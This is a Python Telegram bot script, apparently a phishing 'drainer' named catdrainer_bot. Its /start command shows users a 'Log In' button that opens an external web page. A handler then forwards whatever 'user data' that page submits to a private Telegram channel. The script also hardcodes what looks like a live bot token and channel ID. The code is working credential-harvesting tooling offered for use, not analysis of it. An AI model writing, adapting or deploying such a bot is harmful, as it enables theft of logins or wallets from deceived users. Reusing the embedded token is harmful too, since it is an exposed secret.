from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackContext
import logging
import requests

# 🔹 Bot credentials
BOT_TOKEN = "7879598325:AAFRhrWVUanbI3gxEb4W6Bm1GroQTudgZUQ"
BOT_USERNAME = "catdrainer_bot"
CHAT_ID = "-1002262089486"

# 🔹 WebApp URL (Replace with your Render URL after deployment)
WEB_APP_URL = "https://refunding212.github.io/forealcat/"

# Enable logging
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: CallbackContext):
    """Sends a button to open the WebApp for login"""
    keyboard = [[InlineKeyboardButton("🚀 Click Here to Log In", web_app={"url": WEB_APP_URL})]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("Click the button below to log in:", reply_markup=reply_markup)

async def receive_data(update: Update, context: CallbackContext):
    """Receives data from the WebApp and forwards it to a Telegram channel"""
    data = update.message.text  # Data from WebApp

    # Send data to your Telegram Channel
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=CHAT_ID, text=f"📌 New User Data:\n\n{data}")

def main():
    """Start the bot"""
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
